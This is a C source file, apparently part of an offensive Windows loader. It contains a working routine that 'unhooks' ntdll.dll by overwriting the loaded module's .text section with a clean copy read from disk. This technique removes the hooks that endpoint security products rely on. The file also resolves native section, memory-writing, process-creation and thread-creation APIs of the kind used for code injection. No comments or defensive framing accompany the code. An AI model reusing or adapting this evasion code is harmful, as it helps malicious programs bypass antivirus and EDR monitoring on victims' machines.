#include "ntdll.h"

NT_CREATE_SECTION NtCreateSection = NULL;
NT_MAP_VIEW_OF_SECTION NtMapViewOfSection = NULL;
NT_UNMAP_VIEW_OF_SECTION NtUnmapViewOfSection = NULL;
NT_WRITE_VIRTUAL_MEMORY NtWriteVirtualMemory = NULL;
RTL_INIT_UNICODE_STRING RtlInitUnicodeString = NULL;
RTL_CREATE_PROCESS_PARAMETERS RtlCreateProcessParameters = NULL;
RTL_CREATE_USER_PROCESS RtlCreateUserProcess = NULL;
RTL_CREATE_USER_THREAD RtlCreateUserThread = NULL;
NT_WAIT_FOR_SINGLE_OBJECT NtWaitForSingleObject = NULL;
NT_CLOSE NtClose = NULL;

void unhookNtdll(HMODULE ntdll)
{
	HANDLE currentProcess = GetCurrentProcess();
	MODULEINFO ntdllInformation = {};

	GetModuleInformation(currentProcess, ntdll, &ntdllInformation, sizeof(ntdllInformation));
	LPVOID ntdllBase = (LPVOID)ntdllInformation.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("C:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (int i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
		{
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
}

void loadNtdll(HMODULE ntdll)
{
	NtCreateSection = (NT_CREATE_SECTION)GetProcAddress(ntdll, "NtCreateSection");
	NtMapViewOfSection = (NT_MAP_VIEW_OF_SECTION)GetProcAddress(ntdll, "NtMapViewOfSection");
	NtUnmapViewOfSection = (NT_UNMAP_VIEW_OF_SECTION)GetProcAddress(ntdll, "NtUnmapViewOfSection");
	NtWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(ntdll, "RtlInitUnicodeString");
	RtlCreateProcessParameters = (RTL_CREATE_PROCESS_PARAMETERS)GetProcAddress(ntdll, "RtlCreateProcessParameters");
	RtlCreateUserProcess = (RTL_CREATE_USER_PROCESS)GetProcAddress(ntdll, "RtlCreateUserProcess");
	RtlCreateUserThread = (RTL_CREATE_USER_THREAD)GetProcAddress(ntdll, "RtlCreateUserThread");
	NtWaitForSingleObject = (NT_WAIT_FOR_SINGLE_OBJECT)GetProcAddress(ntdll, "NtWaitForSingleObject");
	NtClose = (NT_CLOSE)GetProcAddress(ntdll, "NtClose");
}

void checkNtStatus(NTSTATUS status)
{
	if (!NT_SUCCESS(status))
	{
		exit(1);
	}
}
